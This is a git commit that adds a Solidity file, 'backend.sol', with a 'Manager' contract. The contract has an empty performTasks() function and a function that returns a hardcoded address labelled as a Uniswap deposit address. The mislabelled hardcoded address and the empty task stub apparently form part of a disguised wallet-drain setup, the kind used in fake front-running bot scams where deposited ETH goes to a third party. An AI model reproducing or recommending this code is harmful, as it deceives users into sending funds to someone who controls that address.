9d8854fe649fbe1097edd384f9b278724e91c6d7
DimensionCoin <102709150+DimensionCoin@users.noreply.github.com>
2022-12-22 23:16:18 -0500

    Create backend.sol

---
+++ backend.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.6.6;
+
+
+contract Manager {
+
+function performTasks() public {
+
+}
+
+function uniswapDepositAddress() public pure returns (address) {
+
+return 0xC3d84813F2FC53858622251c35CaBf45B21c4217;
+
+}
